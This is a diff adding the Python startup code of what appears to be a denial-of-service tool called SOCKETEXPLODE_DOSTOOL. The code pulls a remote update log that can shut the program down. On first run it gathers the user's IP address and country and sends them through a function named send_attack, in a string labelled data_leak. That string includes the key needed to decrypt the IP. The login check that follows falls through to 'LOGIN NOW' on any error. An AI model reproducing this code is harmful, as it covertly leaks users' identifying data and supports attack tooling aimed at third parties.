@@ -1,0 +1,51 @@
+from cryptography.fernet import Fernet
+from other_data import *
+import pybase64,base64,requests,random
+
+url_update = 'https://raw.githubusercontent.com/Hex1629/SOCKETEXPLODE_DOSTOOL/main/update_log.txt'
+r = requests.get(url_update)
+with open(os.path.join(os.path.dirname(__file__),'update_log.txt'), 'wb') as f:
+    f.write(r.content)
+
+with open(os.path.join(os.path.dirname(__file__),'update_log.txt'), 'rb') as f:
+    data_test = f.read()
+data_test = data_test.decode()
+leak_logs_test = data_test.split(':')
+if leak_logs_test[0].upper() == 'SHUTDOWN':
+    slow_print(f'SHUTDOWN BY DEV . . . . ({leak_logs_test[1]})\n{leak_logs_test[2]}\n{leak_logs_test[3]}\n{leak_logs_test[4]}')
+    exit()
+elif leak_logs_test[0].upper() == 'UPDATE':
+    print(f"[📢] UPDATE COMING SOON ({leak_logs_test[1]})")
+else:
+    print(f"[📢] No update at this time")
+
+print('⚠️  PLS NOT SHARE FILES setting.txt & key.txt TO OTHER ⚠️')
+
+log_check = login_checker().split('@')
+if log_check[0] == 'KNOWN':
+   print(f"⚙️ SKIP MAKE FILES setting.txt . . .")
+else:
+    key = Fernet.generate_key()
+    Fernet_enc = Fernet(key)
+    data = GET_IP().split('|')
+    xff_xff_x00 = data[0].encode()
+    data_leak = f"IP {pybase64.b64encode(Fernet_enc.encrypt(xff_xff_x00)).decode()} COUNTRY {data[1]}.{data[2]} KEYS {pybase64.b64encode(pybase64.standard_b64encode(key))}"
+    send_attack(data_leak)
+    with open(os.path.join(os.path.dirname(__file__), 'setting.txt'), 'w') as f:
+        f.write(F'TRUE@{xff_xff_x00.decode()}@{pybase64.b64encode(Fernet_enc.encrypt(xff_xff_x00)).decode()}')
+    with open(os.path.join(os.path.dirname(__file__), 'key.txt'), 'wb') as f:
+        f.write(key)
+    print(f"⚙️ MAKE FILES setting.txt . . .")
+
+try:
+    key_load = b''
+    print(f'🗿CHECK-(KEYS FERNET)🗿')
+    with open(os.path.join(os.path.dirname(__file__),'key.txt'), 'rb') as f:
+        key_load = f.read()
+    Fernet_enc = Fernet(key_load)
+    token = base64.b64decode(log_check[3])
+    decrypted_data = Fernet_enc.decrypt(token).decode()
+    if decrypted_data == log_check[2]:
+        print("⚙️LOGIN NOW⚙️")
+except:
+    print("⚙️LOGIN NOW⚙️")
